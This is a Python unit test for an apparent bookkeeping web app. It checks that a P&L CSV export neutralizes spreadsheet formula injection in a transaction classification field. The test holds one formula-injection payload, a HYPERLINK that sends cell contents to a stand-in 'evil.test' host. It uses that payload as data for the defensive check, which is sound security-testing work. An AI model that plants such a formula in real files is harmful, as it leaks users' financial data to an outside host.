"""Every free-text cell in the CPA-facing P&L export is neutralized against
spreadsheet formula injection.

`business_txn_class.bucket` is a plain TEXT column: the organizational /
startup_195 / operating taxonomy is enforced in application code, not by a
CHECK constraint, and the full-ledger restore path writes the column
straight from an imported CSV. So the value reaching the export cannot be
assumed to be one of the three. If it starts with = + - @ and rides into
pnl.csv unquoted, it executes when the entity owner opens the file — or
hands it to their accountant. The year-end package export already escapes
the same field; this is the invariant that keeps both honest.
"""

import os
import unittest
import uuid

from fastapi.testclient import TestClient

from oikonome.db import tenancy

from .util import _ensure_db, seed_accounts, write_config

FORMULA = '=HYPERLINK("http://evil.test/leak?"&A1,"open")'


class PnlCsvEscapingTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        os.environ["OIKONOME_DEV"] = "1"
        _ensure_db()
        import oikonome.web.app as appmod
        appmod.DEV_MODE = True
        from oikonome.web.app import app
        cls.client = TestClient(app)
        cls.client.post("/api/signup", data={
            "email": f"pnlcsv-{uuid.uuid4().hex[:8]}@example.dev",
            "password": "correct-horse-battery"})
        cls.tid = cls.client.get("/api/me").json()["tenant_id"]
        cls.eid = cls.client.post("/api/business/entities", json={
            "name": "Ledger LLC", "structure": "sole_prop"}).json()["id"]
        conn = tenancy.tenant_connect(cls.tid)
        try:
            seed_accounts(conn)
            write_config(conn)
            conn.execute(
                """INSERT INTO transactions (id, account_id, date, amount,
                       name, pending, removed, entity_id)
                   VALUES ('pnl-t','chk','2026-07-11',42.0,'Supplies',0,0,%s)""",
                (cls.eid,))
            # written the way a restored export writes it: straight into the
            # column, bypassing the application-level taxonomy check
            conn.execute(
                "INSERT INTO business_txn_class (txn_id, bucket) "
                "VALUES ('pnl-t', %s)", (FORMULA,))
        finally:
            conn.close()

    def test_bucket_cell_cannot_carry_a_spreadsheet_formula(self):
        import csv
        import io
        r = self.client.get(f"/api/business/entities/{self.eid}/pnl.csv")
        self.assertEqual(r.status_code, 200, r.text)
        rows = list(csv.reader(io.StringIO(r.text)))
        header = next(i for i, row in enumerate(rows)
                      if row[:2] == ["Date", "Payee"])
        bucket = rows[header + 1][rows[header].index("Bucket")]
        # the value still exports — escaping is a prefix, not a redaction
        self.assertEqual(bucket, "'" + FORMULA)
